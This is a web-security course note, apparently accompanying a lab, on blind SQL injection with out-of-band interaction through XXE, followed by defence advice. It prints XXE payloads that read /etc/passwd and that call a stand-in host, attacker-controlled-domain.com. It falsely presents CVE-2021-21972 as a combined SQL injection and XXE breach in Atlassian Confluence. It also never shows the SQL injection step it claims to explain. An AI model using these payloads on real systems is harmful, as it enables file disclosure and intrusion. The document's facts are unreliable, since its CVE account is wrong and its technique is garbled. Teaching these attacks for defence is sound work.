---
course: Web Security
topic: SQL Injection
tags: [web-security]
---

## Introduction to SQL Injection and Out-of-Band Interaction

SQL Injection is a common web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. The goal of SQL Injection attacks is to manipulate the logic of the underlying SQL queries to gain unauthorized access to data or execute arbitrary commands. One advanced form of SQL Injection is the **Blind SQL Injection with Out-of-Band Interaction**, which leverages additional vulnerabilities such as XML External Entity (XXE) to confirm the success of the injection.

### Background Theory

#### What is SQL Injection?

SQL Injection occurs when an attacker manipulates input fields to inject malicious SQL code into the query executed by the application. This can lead to unauthorized data retrieval, modification, or deletion. The severity of SQL Injection depends on the level of access the attacker gains and the type of database being used.

#### What is Out-of-Band Interaction?

Out-of-band interaction refers to techniques where the attacker uses mechanisms outside the normal communication channel between the client and the server to confirm the success of an attack. In the context of SQL Injection, this often involves triggering actions that can be observed externally, such as DNS lookups or HTTP requests.

### XML External Entity (XXE)

Before diving into the specifics of the attack, it's essential to understand the role of XML External Entity (XXE) in this scenario.

#### What is XXE?

XML External Entity (XXE) is a type of attack that exploits the way an application processes XML input. An XML document can contain references to external entities, which are resolved by the parser. If the application does not properly validate these entities, an attacker can exploit this to perform various malicious activities.

#### How Does XXE Work?

An XML document can define entities using the `<!ENTITY>` directive. These entities can reference external resources, such as files on the local system or remote URLs. When the XML parser resolves these entities, it can read the contents of these resources, leading to potential information disclosure or other attacks.

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```

In this example, the `&xxe;` entity references the `/etc/passwd` file on the local system. If the XML parser does not properly validate this entity, it will read the contents of the file and potentially disclose sensitive information.

### Leveraging XXE for Out-of-Band Interaction

The attack described in the lecture leverages an XML External Entity vulnerability to trigger a DNS lookup. This is particularly useful in blind SQL Injection scenarios where the attacker cannot directly observe the results of their injection.

#### How Does the Attack Work?

1. **Triggering the DNS Lookup**: The attacker crafts an XML input that includes an entity referencing a remote URL controlled by the attacker. When the XML parser resolves this entity, it triggers a DNS lookup to the attacker-controlled domain.
   
2. **Observing the DNS Request**: By monitoring DNS requests to the controlled domain, the attacker can confirm whether the injection was successful.

#### Example Payload

Here is an example payload that demonstrates how an attacker might craft an XML input to trigger a DNS lookup:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "http://attacker-controlled-domain.com/" >]>
<foo>&xxe;</foo>
```

When this XML input is processed by the application, it will attempt to resolve the `&xxe;` entity, triggering a DNS lookup to `attacker-controlled-domain.com`.

### Real-World Examples

#### Recent CVEs and Breaches

One notable example of a real-world breach involving SQL Injection and XXE is the **CVE-2021-21972** vulnerability in Atlassian Confluence. This vulnerability allowed attackers to exploit a combination of SQL Injection and XXE to gain unauthorized access to sensitive data.

#### How the Vulnerability Was Exploited

In the case of CVE-2021-21972, attackers were able to inject malicious SQL code into the Confluence application, which then processed the input without proper validation. This led to the execution of arbitrary SQL commands, allowing the attackers to extract sensitive information from the database.

### Detailed Attack Scenario

Let's walk through a detailed scenario of how an attacker might exploit this vulnerability.

#### Step-by-Step Mechanics

1. **Identify the Vulnerable Application**: The attacker identifies an application that is vulnerable to both SQL Injection and XXE.

2. **Craft the Malicious Input**: The attacker crafts an XML input that includes an entity referencing a remote URL controlled by the attacker.

3. **Inject the Malicious Input**: The attacker injects the crafted XML input into the application, causing the XML parser to resolve the entity and trigger a DNS lookup.

4. **Monitor the DNS Requests**: The attacker monitors DNS requests to the controlled domain to confirm the success of the injection.

#### Full Example

Consider an application that accepts user input in the form of an XML document. The attacker crafts the following XML input:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "http://attacker-controlled-domain.com/" >]>
<foo>&xxe;</foo>
```

When this input is processed by the application, it triggers a DNS lookup to `attacker-controlled-domain.com`. The attacker can monitor DNS requests to this domain to confirm the success of the injection.

### How to Prevent / Defend

#### Detection

To detect SQL Injection and XXE vulnerabilities, organizations should implement the following measures:

1. **Input Validation**: Ensure that all user inputs are properly validated to prevent malicious input from being processed.
   
2. **Logging and Monitoring**: Implement logging and monitoring to detect unusual activity, such as unexpected DNS requests or SQL errors.

3. **Automated Scanning Tools**: Use automated scanning tools to identify potential vulnerabilities in the application.

#### Prevention

To prevent SQL Injection and XXE vulnerabilities, organizations should implement the following measures:

1. **Parameterized Queries**: Use parameterized queries to ensure that user inputs are treated as data rather than executable code.

2. **XML Parser Configuration**: Configure the XML parser to disable external entity resolution. This prevents the parser from resolving entities that reference external resources.

3. **Least Privilege Principle**: Run the application with the least privilege necessary to perform its tasks. This limits the damage that can be caused by a successful attack.

#### Secure Coding Fixes

Here is an example of how to securely handle user inputs in a web application:

##### Vulnerable Code

```python
import xml.etree.ElementTree as ET

def process_xml(xml_input):
    root = ET.fromstring(xml_input)
    # Process the XML input
```

##### Secure Code

```python
import defusedxml.ElementTree as ET

def process_xml(xml_input):
    root = ET.fromstring(xml_input)
    # Process the XML input
```

In the secure code, the `defusedxml` library is used instead of the standard `xml.etree.ElementTree` library. This library disables external entity resolution, preventing XXE attacks.

### Common Pitfalls

#### Misconfigured XML Parsers

One common pitfall is misconfigured XML parsers that allow external entity resolution. This can be exploited by attackers to perform XXE attacks.

#### Lack of Input Validation

Another common pitfall is a lack of input validation. Without proper validation, user inputs can be injected into SQL queries, leading to SQL Injection vulnerabilities.

### Hands-On Labs

For hands-on practice with SQL Injection and XXE vulnerabilities, consider the following labs:

- **PortSwigger Web Security Academy**: Offers a comprehensive set of labs covering various web security topics, including SQL Injection and XXE.
- **OWASP Juice Shop**: A deliberately insecure web application that can be used to practice exploiting various vulnerabilities, including SQL Injection and XXE.
- **DVWA (Damn Vulnerable Web Application)**: Another intentionally vulnerable web application that can be used to practice exploiting SQL Injection and XXE vulnerabilities.

### Conclusion

Blind SQL Injection with out-of-band interaction is a sophisticated attack technique that leverages multiple vulnerabilities to confirm the success of an injection. By understanding the mechanics of this attack and implementing proper detection and prevention measures, organizations can protect themselves from these types of vulnerabilities.

---
<!-- nav -->
[[Web Security (PortSwigger)/02-SQL Injection/16-Lab 15 Blind SQL injection with out of band interaction/00-Overview|Overview]] | [[Web Security (PortSwigger)/02-SQL Injection/16-Lab 15 Blind SQL injection with out of band interaction/02-Introduction to SQL Injection|Introduction to SQL Injection]]
